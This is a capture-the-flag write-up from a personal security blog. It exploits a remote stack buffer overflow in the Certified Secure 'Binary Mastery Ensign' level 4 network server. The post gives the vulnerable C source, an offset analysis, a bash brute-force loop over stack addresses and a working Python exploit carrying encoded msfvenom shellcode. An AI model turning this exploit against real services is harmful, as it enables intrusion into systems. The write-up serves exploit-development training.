![Logo](/assets/images/belts-green.png)

In this post we'll continue with level4 of the **Certified Secure Binary Mastery**, [Ensign](https://www.certifiedsecure.com/certification/view/37). 
This time we will be dealing with another buffer overflow issue but now we'll have to exploit the application over the network.
On top of that, there is a logical error which leads to a subtle input validation error. 

To review the previous levels, check the links below:
* [Binary Master: Ensign - Level 1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html)
* [Binary Master: Ensign - Level 2](https://livz.github.io/2016/01/14/binary-master-ensign-2.html)
* [Binary Master: Ensign - Level 3](https://livz.github.io/2016/01/21/binary-master-ensign-3.html)

## 0 - Discovery

Let's connect to the server and check the binary we're dealing with:
```
$ ssh level4@hacking.certifiedsecure.com -p 8266
level4@hacking.certifiedsecure.com's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '16.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      
```

Let's see if we have any mitigation techniques using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally:
```bash
$ checksec.sh --file level4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level4
```

NX is disabled and again there is no stack canary. Good news. Let's verify whether the stack is executable:

```
$ readelf -lW level4 | grep GNU_STACK
 GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

The R**W**E flag suggests Read-**Write**-Execute flags are all enabled. Also remember from the previous levels that ASLR is disabled on the system and all the addresses are static.

## 1 - Vulnerability

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

void handle_client(int fd) {
    char result[256];
    char name[256];
    char *question = "What is your name?\n";
    int n;

    if (write(fd, question, strlen(question)) < strlen(question)) {
        perror("write");
        exit(1);
    }

    n = read(fd, name, sizeof(name));                                   [3]  

    if (n < 0) {
        perror("read");
        exit(1);
    }

    name[n] = 0;

    if (strncmp(name, "1zUeOvtC", 8) != 0) {
        sprintf(result, "Incorrect password");
    } else {
        sprintf(result, "Hi! It is very nice to meet you, %s", name);   [4]
    }

    if (write(fd, result, strlen(result)) < strlen(result)) {
        perror("write");
        exit(1);
    }
}
    
int main(int argc, char **argv) {
    int listenfd;
    int optval;
    struct sockaddr_in addr;

    listenfd = socket(AF_INET, SOCK_STREAM, 0);

    if (listenfd < 0) {
        perror("creating socket");
        exit(1);
    }

    optval = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&optval,
        sizeof(int));

    bzero((char *)&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(5555);

    if (bind(listenfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }

    while(1) {                                                          [1]
        struct sockaddr_in client;
        int clientfd, len, pid;
        
        listen(listenfd, 5);
        len = sizeof(client);
        printf("listening\n");
        clientfd = accept(listenfd, (struct sockaddr *)&client, &len);

        if (clientfd < 0) {
            perror("accept");
            exit(1);
        }

        pid = fork();                                                   [2]        

        if (pid == 0) { /* child */
            handle_client(clientfd);
            close(clientfd);
            exit(0);
        }

        close(clientfd);
    }
    
    return 0;
}

```

First let us understand how the program works:
* The **main** code listens in a loop (**[1]**) for new connections on port 5555 
* It then spawns a new process for every incomming client (**[2]**). This ensures that crashing the child processes will not impact the parent - a very good choice.

Now let's see how we can break it:
* The **handle_client** function first reads maximum 256 bytes from the user into the variable **name** (**[3]**)
* If the supplied password (first 8 characters of the name) is correct, it will copy the name into the **result** array (**[4]**), which is also 256 bytes in size.
* But that's where the problem lies, because it will copy **_the name and a welcome message_**, basically writing past the boundaries of **result** variable and smashing the stack.

## 2 - Exploit
To understand exactly how many bytes we need in order to overwrite the return address, take a look at the stack layout of **handle_client** function:

![Stack layout](/assets/images/bm4-1.png)

The layout and the following observations will help in constructing the proper payload that can overwrite EIP:
* The return address to be overwritten is located at offset 256 + 16 + 4 = 276 bytes. 
* The length of the welcome message, excluding the name, is 33 characters.
* The first 8 represent a static password.
* The return address will be located at offset 276-33=243, which is within the maximum allowed limit of 256. That's where the logical error generated by the incorrect check lies.

So our payload will look like this:
```
| password (8 bytes) | JUNK (235 bytes) | | RET | 
```

Next question is where should we place the payload? We cannot use the previous approach with the shellcode in an environment variable because the program is already started, we cannot control the environment anymore. But we have so much space left in the **name** variable (_Hint!_)

Since there is no ASLR, the address of the buffer on the stack is predictable. My approach here was a bit lazy:
* First I've run the program in the debugger and also on my machine to get an idea about how the addresses of the top of the stack look like.
* Thent I did a small brute-force script to go through each address and construct a corresponding payload. I'm sure there must be a more clever way. Anyway, this approache worked very quickly (around 20-30 seconds), so no need to change it.

To print the value of the stack pointer from C source code, we can just add these two instructions to level4.c:
```c
   register int sp asm ("sp");
   printf("%x", sp);
```

Using this trick, I've found that the stack address for a recompiled level4 run outside the debugger was either **0xffffd690** or **0xffffd6a0** or very close to these values. So the brute-force script - **try.sh** below, goes from 0xFFFFD000 to 0xFFFFF000. This was enough.

```bash
#!/bin/bash

#for i in `seq 0xFFFFD000 0xFFFFF000`;
for i in `seq 4294955008 4294963200`;
do
    python /tmp/bof.py $(printf "%X" $i)
done
```

The python script **bof.py** constructs and sends a payload over the socket for each value in the chosen range. One more thing here. We need a different shellcode than before. Spawning /bin/dash will not help us at all. I went for a payload that runs the **victory** binary and pipes the result to a temporary file:
```bash
# msfvenom  -p linux/x86/exec CMD="/home/level5/victory > /tmp/out" -e x86/shikata_ga_nai -b '\x00' -f python
```

So let's put everything together:

```python
#!/usr/bin/python                                                                                                   
import socket
import struct
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.settimeout(15)
host = "127.0.0.1"
port = 5555

# Output victory to /tmp/out 
# msfvenom  -p linux/x86/exec CMD="/home/level5/victory > /tmp/out" -e x86/shikata_ga_nai -b '\x00' -f python
buf =  ""
buf += "\xdb\xcb\xd9\x74\x24\xf4\xbb\x5c\xb7\x43\x7e\x5a\x31"
buf += "\xc9\xb1\x11\x31\x5a\x1a\x83\xea\xfc\x03\x5a\x16\xe2"
buf += "\xa9\xdd\x48\x26\xc8\x70\x29\xbe\xc7\x17\x3c\xd9\x7f"
buf += "\xf7\x4d\x4e\x7f\x6f\x9d\xec\x16\x01\x68\x13\xba\x35"
buf += "\x4a\xd4\x3a\xc6\xa4\xbc\x55\xab\xdf\x13\xc5\x56\x56"
buf += "\x09\x79\xac\xb9\xa7\xe8\xad\xb1\x28\x98\x48\x1a\x89"
buf += "\x7c\x84\x2e\x98\x0c\xf5\xa1\x17\x98\x09\x69\x8b\xe9"
buf += "\xeb\x58\xab"

try:
    s.connect((host, port))
    print "[*] Connected."
    
    # Get question
    data = s.recv(64)
    print data
    
    # Send name
    offset = int(sys.argv[1], 16)  # 0xffffcfc8
    print "[*] Trying offsfet: %X" % offset
    ret =  struct.pack("<L", offset+40)
    buf = "1zUeOvtC" + "\x90"*100 + buf + "\x90"*(235-100-len(buf)) + ret + "\n"
    s.sendall(buf)

    data = s.recv(300)
    print data
finally:
    s.close
```

## 3 - Profit

```bash
$ bash /tmp/try.sh
$ cat /tmp/out

   ___  _                      __  ___         __
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____    
                            / -_) _ \(_-</ / _ `/ _ \   
                            \__/_//_/___/_/\_, /_//_/   
                                          /___/  
Subject: Victory!                         

Congrats, you have solved level4. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level4 @ binary mastery ensign)
   * the exploit 
   
You can now start with level5. If you want, you can log in
as level5 with password  [REDACTED]
```

In the next and [final level](https://livz.github.io/2016/02/09/binary-master-ensign-5.html) of this set of challenges we'll work with more stack smashing, but this time we'll have to defeat some homemade canaries. Good fun!
